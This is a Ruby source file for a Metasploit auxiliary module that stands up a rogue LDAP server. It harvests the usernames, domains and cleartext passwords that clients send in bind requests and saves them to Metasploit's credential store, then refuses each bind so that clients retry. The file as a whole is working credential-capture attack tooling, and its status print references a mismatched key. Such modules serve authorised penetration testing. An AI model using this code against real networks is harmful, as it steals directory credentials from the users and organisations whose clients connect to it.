##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
    include Msf::Auxiliary::Report
    include Msf::Exploit::Remote::LDAP::Server
  
    def initialize(info = {})
      super(
        update_info(
          info,
          'Name' => 'Authentication Capture: LDAP',
          'Description' => %q{
            This module mocks an LDAP service to capture authentication
            information of a client trying to authenticate against an LDAP service
          },
          'Author' => 'JustAnda7',
          'License' => MSF_LICENSE,
          'Action' => [
            [ 'Capture', { 'Description' => 'Run an LDAP capture server' } ]
          ],
          'PassiveActions' => [ 'Capture' ],
          'DefaultActions' => 'Capture',
          'Notes' => {
            'Stability' => [],
            'Reliability' => [],
            'SideEffects' => []
          }
        )
      )
  
      register_options(
        [
          OptAddress.new('SRVHOST', [ true, 'The localhost to listen on.', '0.0.0.0' ]),
          OptPort.new('SRVPORT', [ true, 'The local port to listen on.', '389' ]),
          OptString.new('Authentication', [ false, 'The type of authentication used by the client.', 'Simple' ])
        ]
      )
    end
  
    def setup
      super
      @state = {}
    end
  
    def run
      exploit
    end
  
    def on_dispatch_request(client, data)
      return if data.strip.empty? || data.strip.nil?
  
      @state[client] = {
        name: "#{client.peerhost}:#{client.peerport}",
        ip: client.peerhost,
        port: client.peerport
      }
  
      data.extend(Net::BER::Extensions::String)
      begin
        pdu = Net::LDAP::PDU.new(data.read_ber!(Net::LDAP::AsnSyntax))
        vprint_status("LDAP request data remaining: #{data}") unless data.empty?
  
        resp = case pdu.app_tag
               when Net::LDAP::PDU::BindRequest
                 domains = []
                 user_login = pdu.bind_parameters
  
                 if !user_login.name.empty?
                   if user_login.name =~ /@/
                     pub_info = user_login.name.split('@')
                     if pub_info.length <= 2
                       @state[client][:user] = pub_info[0]
                       @state[client][:domain] = pub_info[1]
                     end
                   elsif user_login.name =~ /,/
                     names = user_login.name.split(',')
                     if names[0] =~ /cn=/
                       @state[client][:user] = names.shift.split('=').last
                     end
                     names.each do |name|
                       if name =~ /dc=/
                         domains << name.split('=').last
                       end
                     end
                     @state[client][:domain] = domains.join('.')
                   else
                     service.encode_ldap_response(
                       pdu.message_id,
                       Net::LDAP::ResultCodeInvalidCredentials,
                       '',
                       '',
                       Net::LDAP::PDU::BindResult
                     )
                   end
                 else
                   @state[client][:user] = ''
                   @state[client][:domain] = ''
                 end
  
                 @state[client][:pass] = user_login.authentication
  
                 unless @state[client][:user].empty? && @state[client][:pass].empty?
                   report_cred(
                     ip: @state[client][:ip],
                     port: client.localport,
                     service_name: 'ldap',
                     user: @state[client][:user],
                     password: @state[client][:pass],
                     domain: @state[client][:domain]
                   )
  
                 end
                 print_good("LDAP Login Attempt => From:#{@state[client][:name]} Username:#{@state[client][:user]} Password:#{@state[client][:password]}")
                 service.encode_ldap_response(
                   pdu.message_id,
                   Net::LDAP::ResultCodeAuthMethodNotSupported,
                   '',
                   'Try Again or Use a different Authentication Method',
                   Net::LDAP::PDU::BindResult
                 )
               else
                 service.encode_ldap_response(
                   pdu.message_id,
                   Net::LDAP::ResultCodeUnwillingToPerform,
                   '',
                   Net::LDAP::ResultStrings[Net::LDAP::ResultCodeUnwillingToPerform],
                   Net::LDAP::PDU::SearchResult
                 )
               end
  
        resp.nil? ? client.close : on_send_response(client, resp)
      rescue StandardError => e
        print_error("Failed to handle LDAP request due to #{e}")
        client.close
      end
    end
  
    def report_cred(opts)
      service_data = {
        address: opts[:ip],
        port: opts[:port],
        service_name: opts[:service_name],
        protocol: 'tcp',
        workspace_id: myworkspace_id
      }
  
      credential_data = {
        origin_type: :service,
        module_fullname: fullname,
        username: opts[:user],
        private_data: opts[:password],
        private_type: :password,
        domain: opts[:domain],
        realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
        realm_value: opts[:domain]
      }.merge(service_data)
  
      login_data = {
        core: create_credential(credential_data),
        status: Metasploit::Model::Login::Status::UNTRIED
      }.merge(service_data)
  
      create_credential_login(login_data)
    end
  
  end
  